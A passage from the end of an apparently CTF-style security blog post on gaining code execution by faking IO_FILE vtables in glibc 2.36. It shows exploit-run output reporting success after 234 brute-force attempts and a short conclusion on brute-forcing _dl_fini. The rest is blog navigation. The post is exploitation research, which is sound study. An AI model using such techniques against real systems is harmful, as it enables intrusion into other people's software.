<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">pwn!!!</span><br><span class="line">pwn after 234 attempts</span><br></pre></td></tr></table></figure>
<h2 id="Conclusion">Conclusion</h2>
<p>The offset between libc and ld is not a constant value so we need to bruteforce the <code>_dl_fini</code> here since it’s in ld.<br>
With a ld leaking the exploitation can be more reliable. And I will show a much more reliable way to exploit in next chapter.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">KpwnZ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://kpwnz.github.io/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/">https://kpwnz.github.io/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnerability/">Vulnerability</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://source.unsplash.com/featured/?landscape,tech,life" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/"><img class="prev-cover" src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/11/CodeQL-XNU/"><img class="next-cover" src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CodeQL+XNU</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-25</div><div class="title">CVE-2020-11102: Escape from the Earth</div></div></a></div><div><a href="/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/" title="Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x1]"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-30</div><div class="title">Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x1]</div></div></a></div><div><a href="/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/" title="Analyze CVE-2022-32792: Faster Than Light, but at What Cost?"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-03</div><div class="title">Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</div></div></a></div><div><a href="/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/" title="CVE-2022-46702: Remember to Clean Up the Memory"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-22</div><div class="title">CVE-2022-46702: Remember to Clean Up the Memory</div></div></a></div><div><a href="/2022/10/29/evilCallback-CVE-2021-21225/" title="evilCallback: CVE-2021-21225"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">evilCallback: CVE-2021-21225</div></div></a></div><div><a href="/2021/11/22/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021-PWN/" title="西湖论剑2021 PWN"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-22</div><div class="title">西湖论剑2021 PWN</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/22996989?s=400&amp;u=470b81ce0dd0fd2e15880f564e1bef0ba9655225&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">KpwnZ</div><div class="author-info__description">~ shit post ~</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">16</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/KpwnZ"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vtable-validation"><span class="toc-number">1.1.</span> <span class="toc-text">vtable validation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Defeat-PTR-MAGLE"><span class="toc-number">1.2.</span> <span class="toc-text">Defeat PTR_MAGLE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.3.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2020-11102: Escape from the Earth"/></a><div class="content"><a class="title" href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth">CVE-2020-11102: Escape from the Earth</a><time datetime="2023-04-24T16:50:54.000Z" title="Created 2023-04-25 00:50:54">2023-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/" title="CVE-2022-46702: Remember to Clean Up the Memory"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2022-46702: Remember to Clean Up the Memory"/></a><div class="content"><a class="title" href="/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/" title="CVE-2022-46702: Remember to Clean Up the Memory">CVE-2022-46702: Remember to Clean Up the Memory</a><time datetime="2022-12-22T14:28:55.000Z" title="Created 2022-12-22 22:28:55">2022-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/29/evilCallback-CVE-2021-21225/" title="evilCallback: CVE-2021-21225"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="evilCallback: CVE-2021-21225"/></a><div class="content"><a class="title" href="/2022/10/29/evilCallback-CVE-2021-21225/" title="evilCallback: CVE-2021-21225">evilCallback: CVE-2021-21225</a><time datetime="2022-10-29T04:27:58.000Z" title="Created 2022-10-29 12:27:58">2022-10-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/" title="Analyze CVE-2022-32792: Faster Than Light, but at What Cost?"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Analyze CVE-2022-32792: Faster Than Light, but at What Cost?"/></a><div class="content"><a class="title" href="/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/" title="Analyze CVE-2022-32792: Faster Than Light, but at What Cost?">Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</a><time datetime="2022-10-03T13:21:51.000Z" title="Created 2022-10-03 21:21:51">2022-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/" title="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]"/></a><div class="content"><a class="title" href="/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/" title="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</a><time datetime="2022-09-30T04:44:16.000Z" title="Created 2022-09-30 12:44:16">2022-09-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By KpwnZ</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>